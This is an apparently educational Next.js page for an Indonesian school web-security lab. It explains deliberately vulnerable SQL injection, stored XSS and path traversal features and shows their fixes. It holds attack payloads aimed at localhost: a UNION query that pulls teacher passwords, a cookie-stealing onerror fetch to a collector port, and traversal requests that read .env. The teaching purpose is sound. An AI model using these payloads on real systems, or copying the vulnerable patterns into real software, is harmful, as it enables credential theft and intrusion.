import Link from "next/link";
import { SECURE_MODE } from "@/lib/config";

export const metadata = {
  title: "Praktikum Keamanan Web — XI TKJ 3",
};

function Code({ children }) {
  return (
    <pre className="mt-3 overflow-x-auto rounded-xl border border-slate-800 bg-slate-950 p-4 font-mono text-xs leading-relaxed text-slate-300">
      {children}
    </pre>
  );
}

function Bagian({ id, nomor, judul, ikon, children }) {
  return (
    <section
      id={id}
      className="scroll-mt-24 rounded-3xl border border-slate-800 bg-slate-900/60 p-6 sm:p-8"
    >
      <h2 className="flex items-center gap-3 text-2xl font-bold text-slate-100">
        <span className="grid h-10 w-10 place-items-center rounded-xl bg-gradient-to-br from-cyan-600 to-blue-600 text-lg">
          {ikon}
        </span>
        {nomor}. {judul}
      </h2>
      <div className="mt-5 space-y-5 text-slate-300">{children}</div>
    </section>
  );
}

function Sub({ judul, children }) {
  return (
    <div>
      <h3 className="text-sm font-bold uppercase tracking-wider text-cyan-400">{judul}</h3>
      <div className="mt-2 leading-relaxed text-slate-300">{children}</div>
    </div>
  );
}

export default function HalamanPraktikum() {
  return (
    <div className="mx-auto max-w-4xl px-4 py-12">
      <header>
        <h1 className="text-4xl font-extrabold text-slate-100">
          🛡️ Praktikum <span className="bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent">Keamanan Web</span>
        </h1>
        <p className="mt-3 leading-relaxed text-slate-400">
          Website profil {`kelas XI TKJ 3`} ini sekaligus menjadi laboratorium keamanan aplikasi
          web. Pada <b>MODE RENTAN</b>, tiga fitur sengaja dibuat memiliki kelemahan umum agar bisa
          ditemukan, dianalisis, lalu diperbaiki. Dokumentasi lengkap tersedia di file{" "}
          <code className="rounded bg-slate-800 px-1.5 py-0.5 font-mono text-xs">
            docs/ANALISIS-KEAMANAN.md
          </code>{" "}
          dan <code className="rounded bg-slate-800 px-1.5 py-0.5 font-mono text-xs">docs/PANDUAN-PRAKTIKUM.md</code>.
        </p>

        {SECURE_MODE ? (
          <p className="mt-4 rounded-xl border border-emerald-500/40 bg-emerald-500/10 p-4 text-sm text-emerald-300">
            🔒 Saat ini aplikasi berjalan dalam <b>MODE AMAN</b> — semua perbaikan aktif. Ubah{" "}
            <code className="font-mono">SECURE_MODE=0</code> di file <code className="font-mono">.env</code>{" "}
            lalu restart server untuk kembali ke versi rentan dan mencoba serangannya.
          </p>
        ) : (
          <p className="mt-4 rounded-xl border border-rose-500/40 bg-rose-500/10 p-4 text-sm text-rose-300">
            ⚠️ Saat ini aplikasi berjalan dalam <b>MODE RENTAN</b> — serangan di bawah ini bisa
            langsung dicoba. Ubah <code className="font-mono">SECURE_MODE=1</code> di file{" "}
            <code className="font-mono">.env</code> lalu restart server untuk mengaktifkan versi
            yang sudah diperbaiki.
          </p>
        )}
      </header>

      <div id="mengganti-mode" className="mt-10 scroll-mt-24 rounded-2xl border border-slate-800 bg-slate-900/60 p-6">
        <h2 className="text-xl font-bold text-slate-100">🔄 Mengganti Mode Rentan ⇄ Aman</h2>
        <p className="mt-2 text-sm leading-relaxed text-slate-400">
          Kedua versi ada dalam satu codebase. Perbedaannya dikendalikan environment variable{" "}
          <code className="rounded bg-slate-800 px-1.5 py-0.5 font-mono text-xs">SECURE_MODE</code>:
        </p>
        <Code>{`# Versi RENTAN (praktikum) — default
npm run dev

# Versi AMAN (sudah diperbaiki)
npm run dev:aman

# atau via .env
SECURE_MODE=0   # rentan
SECURE_MODE=1   # aman
# lalu restart server`}</Code>
      </div>

      <div className="mt-8 space-y-8">
        {/* ============ A. SQL INJECTION ============ */}
        <Bagian id="a-sql-injection" nomor="A" judul="SQL Injection" ikon="🗄️">
          <Sub judul="Lokasi kerentanan">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>
                Fitur <b>pencarian siswa</b> — halaman <code className="font-mono text-xs">/siswa?q=…</code>{" "}
                dan API <code className="font-mono text-xs">GET /api/siswa/search?q=…</code>
              </li>
              <li>
                Parameter <code className="font-mono text-xs">id</code> pada halaman profil{" "}
                <code className="font-mono text-xs">/siswa/[id]</code>
              </li>
              <li>Kode: <code className="font-mono text-xs">lib/siswa.js</code> → fungsi{" "}
                <code className="font-mono text-xs">cariSiswa()</code>,{" "}
                <code className="font-mono text-xs">getSiswaById()</code>,{" "}
                <code className="font-mono text-xs">tambahKomentar()</code>
              </li>
            </ul>
          </Sub>

          <Sub judul="Penyebab">
            Input pengguna digabung <b>langsung</b> (string concatenation) ke dalam perintah SQL,
            sehingga input dapat mengubah struktur query:
            <Code>{`// ⚠️ RENTAN — lib/siswa.js
const sql = \`SELECT * FROM siswa
  WHERE nama_lengkap LIKE '%\${q}%' OR ... \`;
// q = "' OR 1=1 -- -"  →  WHERE nama_lengkap LIKE '%' OR 1=1 -- -%'
//                                                 ^^^^^^ kondisi baru`}</Code>
          </Sub>

          <Sub judul="Dampak">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>Membocorkan seluruh data siswa tanpa otorisasi.</li>
              <li>
                Dengan <b>UNION SELECT</b>, data tabel lain bisa diambil — di aplikasi ini ada
                tabel <code className="font-mono text-xs">users</code> berisi akun guru dengan
                password.
              </li>
              <li>(Pada konfigurasi lain) mengubah/menghapus data, bahkan mengendalikan server.</li>
            </ul>
          </Sub>

          <Sub judul="Cara menguji (mode rentan)">
            <Code>{`# 1. Boolean-based: tampilkan SEMUA siswa meski kata kunci kosong
curl "http://localhost:3000/api/siswa/search?q=' OR 1=1 -- -"

# 2. UNION-based: mencuri username & password dari tabel users
curl "http://localhost:3000/api/siswa/search?q=' UNION SELECT 1, username, '-', 'XI TKJ 3', password, '', '', '', 'kredensial guru', '' FROM users-- -"

# 3. Error-based: payload rusak → pesan error SQL bocor ke respons
curl "http://localhost:3000/api/siswa/search?q='"`}</Code>
          </Sub>

          <Sub judul="Perbaikan (versi aman)">
            Gunakan <b>parameterized query / prepared statement</b> — input hanya dikirim sebagai
            nilai parameter <code className="font-mono text-xs">(?)</code>, tidak pernah menyusun
            sintaks SQL. Tambahkan pula penanganan error yang tidak membocorkan detail internal.
            <Code>{`// ✅ AMAN — lib/siswa.js
const like = \`%\${q}%\`;
const [rows] = await pool.execute(
  \`SELECT * FROM siswa
     WHERE nama_lengkap LIKE ? OR nama_panggilan LIKE ? OR keahlian LIKE ?\`,
  [like, like, like]   // ← data dipisah dari kode SQL
);`}</Code>
          </Sub>
        </Bagian>

        {/* ============ B. XSS ============ */}
        <Bagian id="b-cross-site-scripting-xss" nomor="B" judul="Cross-Site Scripting (XSS)" ikon="🧨">
          <Sub judul="Lokasi kerentanan">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>
                Fitur <b>komentar / buku tamu</b> di halaman profil siswa (
                <code className="font-mono text-xs">/siswa/[id]</code>)
              </li>
              <li>
                API: <code className="font-mono text-xs">POST /api/komentar</code> (menyimpan) dan{" "}
                <code className="font-mono text-xs">GET /api/komentar?siswa_id=…</code> (menampilkan)
              </li>
              <li>
                Kode: <code className="font-mono text-xs">lib/siswa.js</code> →{" "}
                <code className="font-mono text-xs">tambahKomentar()</code>;{" "}
                <code className="font-mono text-xs">components/CommentSection.js</code> →{" "}
                <code className="font-mono text-xs">dangerouslySetInnerHTML</code>
              </li>
            </ul>
          </Sub>

          <Sub judul="Penyebab">
            Komentar dari pengguna disimpan <b>mentah tanpa validasi/sanitasi</b>, lalu saat
            ditampilkan kembali dirender sebagai HTML (<code className="font-mono text-xs">dangerouslySetInnerHTML</code>)
            tanpa output encoding. Script milik penyerang ikut dieksekusi browser korban
            (Stored XSS).
            <Code>{`// ⚠️ RENTAN — input disimpan mentah, tanpa validasi & sanitasi
await pool.query(\`INSERT INTO komentar ... VALUES (\${isi})\`);

// ⚠️ RENTAN — output dirender sebagai HTML mentah
<div dangerouslySetInnerHTML={{ __html: komentar.isi }} />`}</Code>
          </Sub>

          <Sub judul="Dampak">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>Mencuri cookie/session atau token pengunjung halaman profil.</li>
              <li>Menipu pengunjung (phishing: form palsu, redirect ke situs jahat).</li>
              <li>Melakukan aksi atas nama korban (mis. mengirim komentar spam otomatis).</li>
            </ul>
          </Sub>

          <Sub judul="Cara menguji (mode rentan)">
            Buka profil siswa mana pun → isi komentar dengan payload → kirim → halaman yang sama
            mengeksekusinya (Stored XSS):
            <Code>{`<img src=x onerror=alert('XSS — Stored')>
<img src=x onerror=fetch('http://localhost:9999?cookie='+document.cookie)>
<script>alert(1)</script>   <\u0021-- via innerHTML tag <script> TIDAK dieksekusi,
                                 itulah kenapa payload img/onerror dipakai -->`}</Code>
            Atau lewat API:
            <Code>{`curl -X POST http://localhost:3000/api/komentar \\
  -H "Content-Type: application/json" \\
  -d '{"siswa_id":1,"penulis":"attacker","isi":"<img src=x onerror=alert(1)>"}'`}</Code>
          </Sub>

          <Sub judul="Perbaikan (versi aman)">
            Pertahanan berlapis: <b>validasi input</b> (panjang wajar), <b>sanitasi</b> (komentar
            tidak mengizinkan HTML sama sekali; untuk rich-text gunakan library seperti DOMPurify),
            <b> parameterized query</b>, dan <b>output encoding</b> — komentar dirender sebagai
            teks biasa sehingga React otomatis meng-escape.
            <Code>{`// ✅ AMAN — server: validasi + sanitasi + parameterized
if (!teks || teks.length > 500) throw new Error("Komentar wajib diisi (maks. 500)");
const tanpaTag = teks.replace(/<[^>]*>/g, ""); // HTML tidak diizinkan
await pool.execute("INSERT INTO komentar ... VALUES (?, ?, ?)", [id, nama, tanpaTag]);

// ✅ AMAN — tampilan: render sebagai TEKS (bukan HTML)
<p>{k.isi}</p>`}</Code>
          </Sub>
        </Bagian>

        {/* ============ C. PATH TRAVERSAL ============ */}
        <Bagian id="c-path-traversal" nomor="C" judul="Path Traversal" ikon="📂">
          <Sub judul="Lokasi kerentanan">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>
                Penyaji foto: <code className="font-mono text-xs">GET /api/foto?file=…</code> (dipakai
                foto siswa &amp; foto kelas)
              </li>
              <li>
                Kode: <code className="font-mono text-xs">app/api/foto/route.js</code>
              </li>
            </ul>
          </Sub>

          <Sub judul="Penyebab">
            Aplikasi membentuk path file langsung dari input pengguna tanpa pembatasan direktori
            maupun validasi nama file, sehingga <code className="font-mono text-xs">../</code> bisa
            keluar dari folder foto:
            <Code>{`// ⚠️ RENTAN — app/api/foto/route.js
const file = request.nextUrl.searchParams.get("file");
const filePath = path.join(FOTO_DIR, file);   // tanpa validasi!
const data = await fs.readFile(filePath);      // bisa membaca file mana pun`}</Code>
          </Sub>

          <Sub judul="Dampak">
            Penyerang dapat <b>membaca file sensitif di server</b> yang semestinya tidak bisa
            diakses lewat web: file <code className="font-mono text-xs">.env</code> (isi password
            database), source code, file konfigurasi, hingga file sistem.
          </Sub>

          <Sub judul="Cara menguji (mode rentan)">
            <Code>{`# Membaca file .env project (bocorkan kredensial database)
curl "http://localhost:3000/api/foto?file=..%5C..%5C.env"

# Membaca file source code
curl "http://localhost:3000/api/foto?file=..%5C..%5Cpackage.json"

# Membaca file apa pun di drive server — cukup naikkan ../ sesuai kedalaman folder
curl "http://localhost:3000/api/foto?file=..%5C..%5C..%5C..%5C..%5Cberkas_rahasia.txt"`}</Code>
            <p className="mt-2 text-xs text-slate-500">
              %5C = karakter <code className="font-mono">\</code> yang di-URL-encode. Variasi umum:
              <code className="font-mono"> ....//....//</code>, <code className="font-mono">..%2f..%2f</code>.
            </p>
          </Sub>

          <Sub judul="Perbaikan (versi aman)">
            <ul className="list-disc space-y-1 pl-5 text-sm">
              <li>
                <b>Validasi nama file</b>: wajib nama sederhana (<code className="font-mono text-xs">basename</code>) —
                tolak <code className="font-mono text-xs">../</code>, path absolut, dan dotfile.
              </li>
              <li>
                <b>Whitelist ekstensi</b> gambar (.svg/.png/.jpg/.jpeg/.webp/.gif).
              </li>
              <li>
                <b>Pembatasan direktori</b>: hasil <code className="font-mono text-xs">path.resolve()</code>{" "}
                harus tetap di dalam folder foto.
              </li>
              <li>Pesan error tidak membocorkan path server.</li>
            </ul>
            <Code>{`// ✅ AMAN — app/api/foto/route.js
const nama = path.basename(file);
if (!file || nama !== file || file.includes("..") || nama.startsWith("."))
  return new Response("Nama file tidak diizinkan.", { status: 400 });
if (!MIME[path.extname(nama).toLowerCase()])
  return new Response("Format file tidak diizinkan.", { status: 400 });
const resolved = path.resolve(FOTO_DIR, nama);
if (!resolved.startsWith(FOTO_DIR + path.sep))
  return new Response("Nama file tidak diizinkan.", { status: 400 });
const data = await fs.readFile(resolved);`}</Code>
          </Sub>
        </Bagian>
      </div>

      <footer className="mt-12 rounded-2xl border border-cyan-500/30 bg-cyan-500/5 p-6 text-sm leading-relaxed text-slate-300">
        <b className="text-cyan-400">Catatan etika:</b> aplikasi ini hanya untuk latihan di lingkungan
        lokal (localhost) milik kelompok sendiri. Menguji kerentanan pada sistem orang lain tanpa
        izin adalah tindakan ilegal dan melanggar hukum (UU ITE).
      </footer>
    </div>
  );
}
